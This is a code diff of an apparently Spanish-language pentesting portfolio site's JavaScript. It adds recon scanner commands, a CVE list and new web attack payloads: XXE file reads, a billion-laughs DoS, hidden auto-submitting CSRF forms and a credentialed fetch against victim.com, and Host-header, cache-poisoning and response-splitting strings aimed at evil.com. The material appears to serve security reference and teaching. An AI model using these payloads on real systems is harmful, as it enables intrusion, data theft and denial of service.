+ { name:"Banner grabbing",             cmd:"nmap -sV --version-intensity 9 {target}",                 desc:"Deteccion de version mas agresiva/detallada" },
+ { name:"Rango de puertos especifico", cmd:"nmap -p 1-1000,3306,5432,6379,27017 {target}",            desc:"Puertos comunes + servicios de base de datos" },
+ { name:"Exportar a Greppable",        cmd:"nmap -oG - {target} | grep open",                         desc:"Formato facil de parsear con grep/awk" },
+ { name:"Traceroute + OS + scripts",   cmd:"nmap -A {target}",                                        desc:"Combina -O -sV -sC --traceroute (agresivo, ruidoso)" },
+ { name:"IPv6",                        cmd:"nmap -6 {target}",                                        desc:"Escaneo sobre IPv6" },
+ { name:"Desde lista de targets",      cmd:"nmap -iL targets.txt -oA scan",                           desc:"Escanea multiples targets desde un archivo" },
+ { name:"Excluir hosts",               cmd:"nmap {target}/24 --exclude 10.0.0.5,10.0.0.6",            desc:"Escanea una subred excluyendo IPs especificas" },
+ { name:"Scripts de autenticacion default", cmd:"nmap --script auth -p- {target}",                    desc:"Busca credenciales por defecto en servicios comunes" },
+ { name:"Interfaz de red especifica",  cmd:"nmap -e eth0 -p- {target}",                               desc:"Fuerza el uso de una interfaz de red determinada" },
+ { name:"Rate limit (paquetes/seg)",   cmd:"nmap --min-rate 500 -p- {target}",                        desc:"Controla la velocidad de envio de paquetes" },
  ],
  ffuf:[
  { name:"Dir \u2014 SecLists medium",      cmd:"ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://{target}/FUZZ -fc 404", desc:"SecLists medium (m\u00E1s completo)" },
@@ -8028,6 +8240,8 @@ const csData = {
  { name:"Descargar subdominios",   cmd:"chaos -d {target}",                                                           desc:"API de Chaos/ProjectDiscovery" },
  { name:"Silent + anew",           cmd:"chaos -d {target} -silent | anew subs.txt",                                   desc:"Solo output para piping" },
  { name:"Pipeline triple fuente",  cmd:"(chaos -d {target} -silent; subfinder -d {target} -silent; assetfinder --subs-only {target}) | sort -u | anew subs.txt", desc:"M\u00E1xima cobertura" },
+ { name:"Listar todos los programas BB", cmd:"chaos -queries",                                                          desc:"Lista los programas de bug bounty indexados por Chaos" },
+ { name:"Contar subdominios",      cmd:"chaos -d {target} -silent | wc -l",                                            desc:"Cuenta rapida de resultados" },
  ],
  puredns:[
  { name:"Brute SecLists 5k",       cmd:"puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt {target}", desc:"Top 5k \u2014 r\u00E1pido y efectivo" },
@@ -8039,6 +8253,8 @@ const csData = {
  massdns:[
  { name:"Resoluci\u00F3n masiva",       cmd:"massdns -r /opt/resolvers.txt -t A subs.txt -o S > out.txt",                  desc:"Alta velocidad DNS masivo" },
  { name:"Output JSON",             cmd:"massdns -r /opt/resolvers.txt -t A domains.txt -o J | jq '.name'",            desc:"Parseable con jq" },
+ { name:"Verificacion CNAME (takeovers)", cmd:"massdns -r /opt/resolvers.txt -t CNAME subs.txt -o S -w cnames.txt",       desc:"Util para detectar candidatos a subdomain takeover" },
+ { name:"Con wildcard filter",     cmd:"massdns -r /opt/resolvers.txt -t A subs.txt --filter NXDOMAIN -o S -w valid.txt", desc:"Descarta dominios que no resuelven" },
  ],
  waybackgau:[
  { name:"Wayback URLs",            cmd:"waybackurls {target} | tee wayback-{target}.txt",                             desc:"URLs hist\u00F3ricas de Wayback Machine" },
@@ -8064,6 +8280,9 @@ const csData = {
  { name:"CIDR completo",           cmd:"masscan {target}/24 -p1-65535 --rate=10000 -oG masscan.txt",                  desc:"Todos los puertos en rango CIDR" },
  { name:"Top puertos web",         cmd:"masscan {target} -p80,443,8080,8443,3000,4000,8000 --rate=5000",              desc:"Puertos web comunes a alta velocidad" },
  { name:"Combinar con nmap",       cmd:"masscan {target}/24 -p1-65535 --rate=10000 -oG - | awk '/open/{print $4}' | sort -u > live.txt && nmap -sV -sC -iL live.txt", desc:"Masscan descubre, nmap profundiza" },
+ { name:"Excluir rangos",          cmd:"masscan {target}/16 -p1-65535 --rate=10000 --excludefile exclude.txt",        desc:"Evita escanear IPs sensibles/fuera de scope" },
+ { name:"Output JSON",             cmd:"masscan {target}/24 -p1-65535 --rate=10000 -oJ masscan.json",                 desc:"Formato JSON para procesar con scripts" },
+ { name:"Banner grabbing basico",  cmd:"masscan {target} -p80,443 --banners --rate=1000",                             desc:"Captura banners a baja velocidad (mas estable)" },
  ],
  naabu:[
  { name:"Port scan b\u00E1sico",        cmd:"naabu -host {target}",                                                        desc:"Esc\u00E1ner de puertos en Go" },
@@ -10689,9 +10908,89 @@ BURP.forEach(function(card){
  }, { passive: true });
 })();
 
+/* \u2550\u2550 QUICK NAV FLOTANTE \u2550\u2550 */
+(function(){
+var wrap = document.getElementById('quicknav');
+var toggle = document.getElementById('quicknav-toggle');
+var panel = document.getElementById('quicknav-panel');
+var closeBtn = document.getElementById('quicknav-close');
+var listEl = document.getElementById('quicknav-list');
+if(!wrap || !toggle || !listEl) return;
+
+var NAV_ITEMS = [
+ {id:'sobre-mi',     icon:'\uD83D\uDC64', label:'Historia'},
+ {id:'habilidades',  icon:'\uD83C\uDFAF', label:'Skills & Areas'},
+ {id:'scanner',      icon:'\uD83D\uDC80', label:'Leviatan Scanner'},
+ {id:'osint',        icon:'\u2316',        label:'OSINT Lookup'},
+ {id:'recon-engine', icon:'\u25C8',        label:'Passive Recon Engine'},
+ {id:'cve-search',   icon:'\uD83D\uDEE1',  label:'CVE Search'},
+ {id:'warroom',      icon:'\u26A1',        label:'War Room'},
+ {id:'cheatsheet',   icon:'\uD83D\uDCD6',  label:'Cheatsheet'},
+ {id:'payloads',     icon:'\uD83D\uDCA3',  label:'Payload Library'},
+ {id:'burpsuite',    icon:'\uD83D\uDD04',  label:'Burp Suite'},
+ {id:'termlab',      icon:'\uD83D\uDCBB',  label:'Command Lab'},
+ {id:'laboratorio',  icon:'\uD83C\uDFAE',  label:'Laboratorio Ofensivo'},
+ {id:'hashcalc',     icon:'#',             label:'Hash Calculator'},
+ {id:'conocimiento', icon:'\uD83D\uDDC4',  label:'Vuln Database'},
+ {id:'headers',      icon:'\uD83D\uDCE1',  label:'HTTP Headers'},
+ {id:'arsenal',      icon:'\u2699',        label:'Hacker Tools'},
+ {id:'hackertools',  icon:'\uD83D\uDD27',  label:'Encoder & Tools'},
+ {id:'roadmap',      icon:'\uD83D\uDDFA',  label:'Hacker Roadmap'},
+ {id:'hallazgos',    icon:'\uD83D\uDCB0',  label:'Hallazgos'},
+ {id:'formacion',    icon:'\uD83C\uDF93',  label:'Formacion'},
+ {id:'writeups',     icon:'\u270D',        label:'Writeups'},
+ {id:'servicios',    icon:'\uD83D\uDCBC',  label:'Servicios'},
+ {id:'contacto',     icon:'\uD83D\uDCEC',  label:'Contacto'},
+];
+
+var itemEls = {};
+NAV_ITEMS.forEach(function(item){
+ var sec = document.getElementById(item.id);
+ if(!sec) return;
+ var el = document.createElement('a');
+ el.href = '#' + item.id;
+ el.className = 'quicknav-item';
+ el.innerHTML = '<span class=\"quicknav-item-icon\">' + item.icon + '</span><span>' + item.label + '</span>';
+ el.addEventListener('click', function(ev){
+ ev.preventDefault();
+ sec.scrollIntoView({ behavior:'smooth', block:'start' });
+ closePanel();
+ });
+ listEl.appendChild(el);
+ itemEls[item.id] = el;
+});
+
+function openPanel(){ wrap.classList.add('open'); }
+function closePanel(){ wrap.classList.remove('open'); }
+toggle.addEventListener('click', function(){
+ if(wrap.classList.contains('open')) closePanel(); else openPanel();
+});
+if(closeBtn) closeBtn.addEventListener('click', closePanel);
+document.addEventListener('click', function(ev){
+ if(wrap.classList.contains('open') && !wrap.contains(ev.target)) closePanel();
+});
+document.addEventListener('keydown', function(ev){
+ if(ev.key === 'Escape') closePanel();
+});
+
+/* Resalta la seccion activa reusando el mismo criterio de .in-view */
+var navIO = new IntersectionObserver(function(entries){
+ entries.forEach(function(e){
+ var el = itemEls[e.target.id];
+ if(!el) return;
+ if(e.isIntersecting) el.classList.add('active');
+ else el.classList.remove('active');
+ });
+}, { threshold: 0.3, rootMargin: '-15% 0px -60% 0px' });
+NAV_ITEMS.forEach(function(item){
+ var sec = document.getElementById(item.id);
+ if(sec) navIO.observe(sec);
+});
+})();
+
 /* \u2550\u2550 CABECERAS HTTP \u2550\u2550 */
 (function(){
-var tabs = document.getElementById('hdrs-tabs');
+var tabs = document.getElementById('hdrs-select');
 var grid = document.getElementById('hdrs-grid');
 if(!tabs || !grid) return;
 
@@ -10966,17 +11265,17 @@ var activeCat = 'all';
 function renderTabs(){
  tabs.innerHTML = '';
  CATS.forEach(function(cat){
- var btn = document.createElement('button');
- btn.className = 'hdrs-tab' + (activeCat === cat.id ? ' active' : '');
- btn.textContent = cat.label;
- btn.onclick = function(){
- activeCat = cat.id;
- document.querySelectorAll('.hdrs-tab').forEach(function(b){ b.classList.remove('active'); });
- btn.classList.add('active');
+ var opt = document.createElement('option');
+ opt.value = cat.id;
+ var n = cat.id === 'all' ? HEADERS.length : HEADERS.filter(function(h){ return h.cat === cat.id; }).length;
+ opt.textContent = cat.label + ' (' + n + ')';
+ if(activeCat === cat.id) opt.selected = true;
+ tabs.appendChild(opt);
+ });
+ tabs.onchange = function(){
+ activeCat = tabs.value;
  renderCards();
  };
- tabs.appendChild(btn);
- });
 }
 
 function renderCards(){
@@ -11170,6 +11469,7 @@ function scanSubdomains(target){
  )].sort().slice(0,60);
  addCard('🔍','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
  setSourceStatus('subdomains','done');
+ if(window.renderAttackGraph) window.renderAttackGraph(domain, subs, []);
  }).catch(function(){
  /* Fallback: HackerTarget hostsearch */
  fetchTXT('https://api.hackertarget.com/hostsearch/?q='+encodeURIComponent(domain))
@@ -11177,6 +11477,7 @@ function scanSubdomains(target){
     var subs = txt.split('\n').filter(function(l){ return l.trim(); }).map(function(l){ return l.split(',')[0]; });
     addCard('🔍','Subdomains', subs.length+' encontrados', tags(subs), 'subdomains');
     setSourceStatus('subdomains','done');
+    if(window.renderAttackGraph) window.renderAttackGraph(domain, subs, []);
   }).catch(function(){ setSourceStatus('subdomains','error'); });
  });
 }
@@ -11498,7 +11799,7 @@ inp.addEventListener('keydown', function(e){
 
 /* \u2550\u2550 PAYLOAD LIBRARY \u2550\u2550 */
 (function(){
-var payTabs = document.getElementById('pay-tabs');
+var payTabs = document.getElementById('pay-select');
 var payGrid = document.getElementById('pay-grid');
 if(!payTabs || !payGrid) return;
 
@@ -11607,6 +11908,9 @@ var PAYLOADS = {
  {label:'XInclude',       pay:'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>', note:'XInclude \u2014 cuando no controlas el DOCTYPE completo'},
  {label:'SVG XXE',        pay:'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', note:'XXE embebido en SVG uploadado'},
  {label:'Bypass filtros', pay:'<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', note:'Cambiar encoding puede bypassar parsers de seguridad'},
+ {label:'Billion laughs (DoS)', pay:'<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>', note:'Expansion exponencial de entidades \u2014 denial of service por consumo de memoria'},
+ {label:'XXE en SOAP', pay:'<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>', note:'APIs SOAP suelen parsear XML sin deshabilitar entidades externas'},
+ {label:'XXE via DOCX/XLSX', pay:'Reemplazar [Content_Types].xml o document.xml dentro del ZIP de un .docx con una entidad XXE', note:'Procesadores de documentos Office (docx/xlsx) parsean XML interno \u2014 vector clasico en uploads'},
  ],
  cmdi:[
  {label:'; b\u00E1sico',       pay:'; whoami',                                           note:'Encadenamiento de comandos \u2014 el m\u00E1s simple'},
@@ -11682,6 +11986,9 @@ var PAYLOADS = {
  {label:'Referencia indirecta', pay:'GET /download?file=invoice_12345.pdf \u2192 invoice_12346.pdf', note:'Referencias predecibles en par\u00E1metros de archivo'},
  {label:'IDOR en DELETE', pay:'DELETE /api/comments/5678',                          note:'Borrar recursos de otros usuarios'},
  {label:'Verb tampering', pay:'Cambiar GET \u2192 POST \u2192 PUT \u2192 DELETE mismo endpoint',   note:'El control de acceso puede ser diferente por m\u00E9todo HTTP'},
+ {label:'IDOR via JWT', pay:'Decodificar JWT, cambiar el claim \"sub\"/\"user_id\" y re-firmar (si el secret es debil/none)', note:'Combina IDOR con ataques de JWT cuando el ID viaja en el token'},
+ {label:'Parametro oculto', pay:'GET /api/profile?id=1234&debug=true',                 note:'Parametros de debug/admin no documentados que exponen datos de otros usuarios'},
+ {label:'IDOR en export', pay:'GET /api/export?report_id=5001 \u2192 5002',              note:'Funciones de exportar/descargar reportes suelen tener menos controles de acceso'},
  ],
  csrf:[
  {label:'HTML form GET',  pay:'<img src="https://victim.com/delete?id=5">',         note:'CSRF via GET \u2014 el browser env\u00EDa la cookie autom\u00E1ticamente'},
@@ -11691,6 +11998,10 @@ var PAYLOADS = {
  {label:'Referer bypass', pay:'<a href="https://victim.com/action?csrf_action=1">',  note:'Si se valida Referer, hacer que el Referer parezca el sitio objetivo'},
  {label:'Token leak',     pay:'CSRF token en la URL \u2192 se filtra en Referer',         note:'Si el token CSRF est\u00E1 en la URL, se filtra via Referer a terceros'},
  {label:'Double submit', pay:'Leer cookie CSRF y enviarlo como param (si CORS permite)', note:'Si el token se verifica contra cookie pero no hay validaci\u00F3n de origen'},
+ {label:'Multipart bypass', pay:'<form enctype=\"multipart/form-data\" method=POST action=\"https://victim.com/action\"><input name=param value=val></form>', note:'multipart/form-data evita el preflight CORS en requests JSON simples'},
+ {label:'text/plain GraphQL', pay:'fetch(\"https://victim.com/graphql\",{method:\"POST\",credentials:\"include\",body:JSON.stringify({query:\"mutation{deleteUser}\"}),headers:{\"Content-Type\":\"text/plain\"}})', note:'Content-Type text/plain es \u201Csimple\u201D \u2014 no dispara preflight aunque el body sea JSON'},
+ {label:'Auto-submit oculto', pay:'<body onload=document.forms[0].submit()><form action=\"https://victim.com/action\" method=POST style=\"display:none\">...</form></body>', note:'Se ejecuta apenas la victima abre la pagina, sin necesidad de click'},
+ {label:'Clickjacking + CSRF', pay:'<iframe src=\"https://victim.com/action\" style=\"opacity:0;position:absolute;\"></iframe>', note:'Combina con clickjacking cuando el CSRF requiere una interaccion del usuario'},
  ],
  redir:[
  {label:'Host injection', pay:'Host: evil.com',                                     note:'Host header injection \u2192 password reset con link malicioso'},
@@ -11700,6 +12011,11 @@ var PAYLOADS = {
  {label:'X-Forwarded-For', pay:'X-Forwarded-For: 127.0.0.1',                       note:'Spoofear IP de origen para bypass de rate limit o whitelist'},
  {label:'Header newline', pay:'param=value%0d%0aInjected-Header: evil',             note:'Injection de header via par\u00E1metro URL o form'},
  {label:'Cache poisoning', pay:'Host: victim.com\nX-Forwarded-Host: evil.com',      note:'Envenenar cach\u00E9 con Host y X-Forwarded-Host diferentes'},
+ {label:'X-Original-URL bypass', pay:'X-Original-URL: /admin',                          note:'Algunos frameworks/proxies enrutan segun este header, saltando reglas de acceso en la URL real'},
+ {label:'X-Rewrite-URL bypass', pay:'X-Rewrite-URL: /admin',                            note:'Variante de X-Original-URL soportada por algunos servidores (IIS/Nginx con modulos especificos)'},
+ {label:'Host con puerto', pay:'Host: victim.com:evil.com',                             note:'Confusion de puerto en el parseo del Host header, puede bypasear validaciones basadas en regex'},
+ {label:'Web cache deception', pay:'/account/settings/nonexistent.css',                 note:'CDN/cache cachea la respuesta HTML como si fuera un asset estatico por la extension'},
+ {label:'HTTP Response Splitting', pay:'/redirect?url=http://ok.com%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK',  note:'Inyecta una respuesta HTTP completa falsa cuando el input no se sanea antes de un header'},
  ],
 };
 
@@ -11716,17 +12032,17 @@ function copyToClipboard(text){
 function renderPayTabs(){
  payTabs.innerHTML = '';
  PAY_CATS.forEach(function(cat){
- var btn = document.createElement('button');
- btn.className = 'hdrs-tab' + (activePay===cat.id?' active':'');
- btn.textContent = cat.label;
- btn.onclick = function(){
- activePay = cat.id;
- document.querySelectorAll('#pay-tabs .hdrs-tab').forEach(function(b){ b.classList.remove('active'); });
- btn.classList.add('active');
+ var opt = document.createElement('option');
+ opt.value = cat.id;
+ var n = (PAYLOADS[cat.id]||[]).length;
+ opt.textContent = cat.label + ' (' + n + ')';
+ if(activePay === cat.id) opt.selected = true;
+ payTabs.appendChild(opt);
+ });
+ payTabs.onchange = function(){
+ activePay = payTabs.value;
  renderPayCards();
  };
- payTabs.appendChild(btn);
- });
 }
 
 function renderPayCards(){
@@ -11925,6 +12241,73 @@ ROADMAP_PHASES.forEach(function(phase, i){
  BASE DE DATOS DE CVEs CR\u00CDTICOS 2019\u20132024
 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 */
 var CVE_DB = [
+ /* \u2500\u2500\u2500 WordPress \u2500\u2500\u2500 */
+ { id:'CVE-2024-25600', score:9.8, sev:'CRITICAL', vendor:'WordPress', name:'Bricks Builder RCE', year:2024, exploited:true,
+ desc:'Ejecuci\u00F3n remota de c\u00F3digo sin autenticaci\u00F3n en el theme/builder Bricks para WordPress via evaluaci\u00F3n insegura de c\u00F3digo PHP.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2024-25600'] },
+ { id:'CVE-2024-27956', score:9.8, sev:'CRITICAL', vendor:'WordPress', name:'Automatic Plugin SQLi', year:2024, exploited:true,
+ desc:'Inyecci\u00F3n SQL sin autenticaci\u00F3n en el plugin Automatic (WordPress) explotada activamente \u2014 en el cat\u00E1logo CISA KEV.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2024-27956'] },
+ { id:'CVE-2023-6553', score:9.8, sev:'CRITICAL', vendor:'WordPress', name:'Backup Migration RCE', year:2023, exploited:true,
+ desc:'Ejecuci\u00F3n remota de c\u00F3digo sin autenticaci\u00F3n en el plugin Backup Migration para WordPress via inyecci\u00F3n de PHP.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2023-6553'] },
+ { id:'CVE-2020-11738', score:9.8, sev:'CRITICAL', vendor:'WordPress', name:'GDPR Compliance Plugin RCE', year:2020, exploited:true,
+ desc:'El plugin WP GDPR Compliance permite a atacantes no autenticados registrar usuarios admin y ejecutar c\u00F3digo arbitrario. Explotado masivamente.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2020-11738'] },
+ { id:'CVE-2019-8942',  score:8.8, sev:'HIGH', vendor:'WordPress', name:'Core RCE via Image Crop', year:2019, exploited:true,
+ desc:'Path traversal en la funci\u00F3n crop-image del core de WordPress, encadenable con CVE-2019-8943 para lograr RCE.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2019-8942'] },
+ { id:'CVE-2021-29447', score:8.0, sev:'HIGH', vendor:'WordPress', name:'Media Library XXE', year:2021, exploited:false,
+ desc:'XML External Entity (XXE) injection en la librer\u00EDa de medios de WordPress via carga de archivos WAV con metadatos malformados.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2021-29447'] },
+ { id:'CVE-2022-21661', score:8.0, sev:'HIGH', vendor:'WordPress', name:'Core SQL Injection', year:2022, exploited:false,
+ desc:'Inyecci\u00F3n SQL en WordPress core via la clase WP_Query, explotable en configuraciones especificas de plugins/temas.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-21661'] },
+ { id:'CVE-2023-2732',  score:9.8, sev:'CRITICAL', vendor:'WordPress', name:'Elementor Pro Auth Bypass', year:2023, exploited:false,
+ desc:'Bypass de autenticaci\u00F3n en Elementor Pro (plugin muy popular de WordPress) que permite tomar control de la cuenta.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2023-2732'] },
+
+ /* \u2500\u2500\u2500 Joomla \u2500\u2500\u2500 */
+ { id:'CVE-2015-8562', score:9.8, sev:'CRITICAL', vendor:'Joomla', name:'Object Injection RCE', year:2015, exploited:true,
+ desc:'Inyecci\u00F3n de objetos PHP via el header User-Agent, permite ejecuci\u00F3n remota de c\u00F3digo sin autenticaci\u00F3n. Uno de los CVEs mas explotados en la historia de Joomla.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2015-8562'] },
+ { id:'CVE-2023-23752', score:5.3, sev:'MEDIUM', vendor:'Joomla', name:'Improper Access Control', year:2023, exploited:true,
+ desc:'Control de acceso indebido en la API REST de Joomla permite a atacantes no autenticados acceder a informaci\u00F3n sensible del sitio (credenciales de BD en algunos casos).',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2023-23752'] },
+ { id:'CVE-2017-8917', score:9.8, sev:'CRITICAL', vendor:'Joomla', name:'SQL Injection en com_fields', year:2017, exploited:true,
+ desc:'Inyecci\u00F3n SQL sin autenticaci\u00F3n en el componente com_fields de Joomla, permite extracci\u00F3n completa de la base de datos.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2017-8917'] },
+ { id:'CVE-2020-11890', score:7.5, sev:'HIGH', vendor:'Joomla', name:'SQL Injection en com_users', year:2020, exploited:false,
+ desc:'Inyecci\u00F3n SQL en el componente com_users de Joomla via par\u00E1metros no saneados.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2020-11890'] },
+
+ /* \u2500\u2500\u2500 Drupal \u2500\u2500\u2500 */
+ { id:'CVE-2018-7600', score:9.8, sev:'CRITICAL', vendor:'Drupal', name:'Drupalgeddon2 RCE', year:2018, exploited:true,
+ desc:'Ejecuci\u00F3n remota de c\u00F3digo sin autenticaci\u00F3n en Drupal core via el sistema de formularios (Form API). Uno de los CVEs mas explotados masivamente en internet.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2018-7600'] },
+ { id:'CVE-2019-6340',  score:8.1, sev:'HIGH', vendor:'Drupal', name:'REST Module RCE', year:2019, exploited:true,
+ desc:'Deserializaci\u00F3n insegura en el m\u00F3dulo REST de Drupal permite ejecuci\u00F3n remota de c\u00F3digo en sitios con ese m\u00F3dulo habilitado.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2019-6340'] },
+ { id:'CVE-2014-3704',  score:7.5, sev:'HIGH', vendor:'Drupal', name:'Drupalgeddon (SQLi)', year:2014, exploited:true,
+ desc:'Inyecci\u00F3n SQL sin autenticaci\u00F3n en Drupal core via la capa de abstracci\u00F3n de base de datos. Explotada autom\u00E1ticamente por bots en horas tras su divulgaci\u00F3n.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2014-3704'] },
+
+ /* \u2500\u2500\u2500 Magento / E-commerce \u2500\u2500\u2500 */
+ { id:'CVE-2022-24086', score:9.8, sev:'CRITICAL', vendor:'Magento', name:'Adobe Commerce RCE', year:2022, exploited:true,
+ desc:'Validaci\u00F3n de entrada indebida en el checkout de Magento/Adobe Commerce permite ejecuci\u00F3n remota de c\u00F3digo sin autenticaci\u00F3n.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-24086'] },
+
+ /* \u2500\u2500\u2500 Otros cr\u00EDticos recientes \u2500\u2500\u2500 */
+ { id:'CVE-2023-46604', score:10.0, sev:'CRITICAL', vendor:'Apache', name:'ActiveMQ RCE', year:2023, exploited:true,
+ desc:'Ejecuci\u00F3n remota de c\u00F3digo en Apache ActiveMQ via deserializaci\u00F3n insegura del protocolo OpenWire. Usado activamente en campa\u00F1as de ransomware.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2023-46604'] },
+ { id:'CVE-2022-22965', score:9.8, sev:'CRITICAL', vendor:'Spring',  name:'Spring4Shell RCE', year:2022, exploited:true,
+ desc:'Ejecuci\u00F3n remota de c\u00F3digo en aplicaciones Spring MVC/WebFlux corriendo sobre JDK 9+, via data binding malicioso.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-22965'] },
+ { id:'CVE-2021-44832', score:6.6, sev:'MEDIUM', vendor:'Apache', name:'Log4j RCE (variante JDBC)', year:2021, exploited:false,
+ desc:'Variante adicional de la vulnerabilidad Log4Shell explotable cuando el atacante controla la configuraci\u00F3n de logging via JDBC Appender.',
+ refs:['https://nvd.nist.gov/vuln/detail/CVE-2021-44832'] },
+
  /* \u2500\u2500\u2500 2024 \u2500\u2500\u2500 */
  { id:'CVE-2024-3400',  score:10.0, sev:'CRITICAL', vendor:'Palo Alto',    name:'PAN-OS Command Injection', year:2024, exploited:true,
  desc:'Inyecci\u00F3n de comandos OS en GlobalProtect de PAN-OS. Explotado activamente como 0-day. Permite RCE sin autenticaci\u00F3n.',
@@ -12170,17 +12553,23 @@ function makeCVECard(cve, delay){
  return card;
 }
 
-function renderPreloaded(filter){
+var activeVendor = 'all';
+
+function renderPreloaded(filter, vendorFilter){
  var container = document.getElementById('cve-preloaded');
  var countEl   = document.getElementById('cve-pl-count');
  if(!container) return;
  container.innerHTML = '';
 
  var filtered = CVE_DB;
- if(filter === 'CRITICAL') filtered = CVE_DB.filter(function(c){ return c.sev==='CRITICAL'; });
- else if(filter === 'HIGH') filtered = CVE_DB.filter(function(c){ return c.sev==='HIGH'; });
- else if(filter === 'MEDIUM') filtered = CVE_DB.filter(function(c){ return c.sev==='MEDIUM'; });
- else if(filter === 'EXPLOITED') filtered = CVE_DB.filter(function(c){ return c.exploited; });
+ if(filter === 'CRITICAL') filtered = filtered.filter(function(c){ return c.sev==='CRITICAL'; });
+ else if(filter === 'HIGH') filtered = filtered.filter(function(c){ return c.sev==='HIGH'; });
+ else if(filter === 'MEDIUM') filtered = filtered.filter(function(c){ return c.sev==='MEDIUM'; });
+ else if(filter === 'EXPLOITED') filtered = filtered.filter(function(c){ return c.exploited; });
+
+ if(vendorFilter && vendorFilter !== 'all'){
+ filtered = filtered.filter(function(c){ return c.vendor === vendorFilter; });
+ }
 
  /* Ordenar: 2024 \u2192 2017, score desc */
  filtered = filtered.slice().sort(function(a,b){ return b.year-a.year || b.score-a.score; });
@@ -12192,8 +12581,29 @@ function renderPreloaded(filter){
  });
 }
 
+/* \u2550\u2550\u2550 MENU DESPLEGABLE POR VENDOR/PRODUCTO \u2550\u2550\u2550 */
+(function(){
+ var sel = document.getElementById('cve-vendor-select');
+ if(!sel) return;
+ var counts = {};
+ CVE_DB.forEach(function(c){ counts[c.vendor] = (counts[c.vendor]||0) + 1; });
+ var vendors = Object.keys(counts).sort(function(a,b){ return counts[b]-counts[a] || a.localeCompare(b); });
+ vendors.forEach(function(v){
+ var opt = document.createElement('option');
+ opt.value = v;
+ opt.textContent = v + ' (' + counts[v] + ')';
+ sel.appendChild(opt);
+ });
+ sel.addEventListener('change', function(){
+ activeVendor = sel.value;
+ renderPreloaded(activeSev, activeVendor);
+ var ph = document.getElementById('cve-preloaded-header');
+ if(ph && ph.scrollIntoView) ph.scrollIntoView({ behavior:'smooth', block:'start' });
+ });
+})();
+
 /* \u2550\u2550\u2550 INIT PRELOADED \u2550\u2550\u2550 */
-renderPreloaded('all');
+renderPreloaded('all', 'all');
 
 /* \u2550\u2550\u2550 FILTROS \u2550\u2550\u2550 */
 var filts = document.querySelectorAll('#cve-filters .cve-filt');
@@ -12208,10 +12618,10 @@ filts.forEach(function(f){
  if(res && res.children.length > 0){
  /* re-renderizar desde resultados de b\u00FAsqueda no pre-cargados */
  }
- renderPreloaded(activeSev);
+ renderPreloaded(activeSev, activeVendor);
  /* Scroll suave a pre-loaded */
  var ph = document.getElementById('cve-preloaded-header');
- if(ph) ph.scrollIntoView({ behavior:'smooth', block:'start' });
+ if(ph && ph.scrollIntoView) ph.scrollIntoView({ behavior:'smooth', block:'start' });
  });
 });
 
@@ -14012,10 +14422,30 @@ async function batch(urls){return Promise.allSettled(urls.map(function(u){return
 function uenc(s){return encodeURIComponent(s);}
 /* === ADAPTIVE INTELLIGENCE ENGINE v2.0 === */
 var aimd={concurrency:4,min:1,max:12,success:0,fail:0,rttSum:0,rttCount:0,adjusting:false};
+function isDeadResult(r){if(r.status!=='fulfilled'||!r.value)return true;return r.value.status===404||r.value.status===0;}
+function ctxSkip(tag){return !!(S.ctx&&S.ctx.skipPhases&&S.ctx.skipPhases.indexOf(tag)>-1);}
 function aimdAdjust(results){var ok=0,bad=0;results.forEach(function(r){if(r.status==='fulfilled'&&r.value&&r.value.ok)ok++;else bad++;});if(ok>bad*2){aimd.success++;if(aimd.success>=3&&aimd.concurrency<aimd.max){aimd.concurrency++;aimd.success=0;}}else{aimd.fail++;if(aimd.fail>=2&&aimd.concurrency>aimd.min){aimd.concurrency=Math.max(aimd.min,Math.ceil(aimd.concurrency/2));aimd.fail=0;aimd.success=0;}}}
 function rttTrack(ms){aimd.rttSum+=ms;aimd.rttCount++;}
 function rttAvg(){return aimd.rttCount>0?aimd.rttSum/aimd.rttCount:0;}
